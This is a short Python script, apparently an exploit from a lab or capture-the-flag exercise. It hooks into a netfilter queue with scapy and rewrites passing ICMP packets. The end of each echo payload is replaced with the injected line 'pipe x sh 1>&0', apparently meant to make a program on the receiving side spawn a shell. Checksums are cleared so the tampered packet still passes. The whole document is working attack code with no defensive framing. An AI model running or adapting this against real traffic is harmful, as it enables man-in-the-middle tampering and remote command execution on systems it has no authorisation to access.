#!/usr/bin/python3

from scapy.all import *
from netfilterqueue import NetfilterQueue


def modify_packets(pkt):
    parsed = IP(pkt.get_payload())
    if ICMP in parsed:
        print("before: %s" % repr(parsed))
        payload = "\npipe\tx\tsh 1>&0\n"
        parsed[ICMP].load = parsed[ICMP].load[0:len(parsed[ICMP].load) - len(payload)] + payload
        print("after: %s" % repr(parsed))
        del parsed[IP].chksum
        del parsed[ICMP].chksum
        del parsed[ICMP].length
        pkt.set_payload(str(parsed))
    pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, modify_packets)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print("")

nfqueue.unbind()
